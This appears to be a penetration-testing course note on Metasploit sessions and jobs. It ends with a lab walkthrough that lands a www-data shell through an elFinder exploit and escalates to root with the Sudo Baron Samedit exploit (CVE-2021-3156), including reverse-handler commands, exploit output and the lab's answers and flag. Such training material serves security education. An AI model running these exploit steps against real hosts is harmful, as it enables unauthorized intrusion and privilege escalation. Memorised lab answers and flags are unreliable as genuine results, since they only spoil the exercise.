# 08 — Metasploit Framework · 2. Sessions

## Sessions

`msfconsole` can manage multiple modules at the same time using **sessions** — dedicated control interfaces for every deployed module.

Once several sessions exist, you can switch between them, attach a different module to a backgrounded session, or convert them into jobs. A backgrounded session keeps running and the connection to the target persists. Sessions can still die if something goes wrong during payload runtime and the communication channel tears down.

### Backgrounding a session

While running an exploit or auxiliary module, you can background the session as long as it has a channel to the target:

- Press `[CTRL] + [Z]`, or
- Type `background` (in a Meterpreter session).

You'll get a confirmation prompt, then return to the `msf6 >` prompt, free to launch another module.

### Listing active sessions

```sh
sessions
```

```
Active sessions
===============
  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501
```

### Interacting with a session

```sh
sessions -i 1
```

```
[*] Starting interaction with 1...
meterpreter >
```

This is useful for running an extra module against an already-exploited host that has a stable channel: background the current session, search for the second module, then select the session number to run it on (from the module's `show options`). These modules usually live in the `post` category — credential gatherers, local exploit suggesters, and internal network scanners.

---

## Jobs

If an active exploit is holding a port you need for another module, you can't just `[CTRL] + [C]` the session — the port stays in use. Instead, use `jobs` to view background tasks and terminate the old one to free the port. Tasks can also be converted into jobs so they keep running in the background even if the session dies.

### Jobs help menu

```sh
jobs -h
```

```
OPTIONS:
    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -i <opt>  Lists detailed info about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID.
    -v        Print more detailed info (use with -i and -l).
```

### Running an exploit as a job

Add `-j` to run an exploit "in the context of a job":

```sh
exploit -j
```

```
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.34:4444
```

### Listing and killing jobs

```sh
jobs -l           # list all running jobs
kill <index>      # kill one job by index
jobs -K           # kill all jobs
```

```
Jobs
====
 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

---

## Lab — elFinder → www-data → Sudo Baron Samedit (root)

**Target:** `10.129.24.225`

### Q1. Web application running on the target

Found in the HTML source.

> **Answer:** `elfinder`

### Q2. Username of the shell obtained via the MSF exploit

Find the existing elFinder exploit in MSF and use it to land a shell.

> **Answer:** `www-data`

### Q3. Exploit the old Sudo version, get root, and read flag.txt

The target runs **Sudo v1.8.31** — vulnerable to CVE-2021-3156 (Baron Samedit).

#### Background the www-data session and search

```sh
background          # backgrounds session 1
search sudo v1.8.31
```

```
#   Name                                    Disclosure Date  Rank       Check  Description
-   ----                                    ---------------  ----       -----  -----------
0   exploit/linux/local/sudo_baron_samedit  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
```

#### Configure the local exploit against the session

```sh
use 0
set lhost 10.10.15.67
show sessions
set session 1
run
```

> **Note:** MSF warns the session architecture (x86) may be incompatible, but the exploit still works against the auto-selected `Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)` target.

```
[*] Writing '/tmp/fmcvF.py' ...
[*] Writing '/tmp/libnss_lkuJ7/0 .so.2' ...
[*] Sending stage (3090404 bytes) to 10.129.24.225
[*] Meterpreter session 2 opened (10.10.15.67:4444 -> 10.129.24.225:44904)
```

#### Drop to a shell and grab the flag

`whoami` isn't a Meterpreter command — drop to a system shell first:

```sh
shell
whoami        # root
ls
cd
ls            # flag.txt  snap
cat flag.txt
```

> **Answer — flag.txt:** `HTB{5e55ion5_4r3_sw33t}`
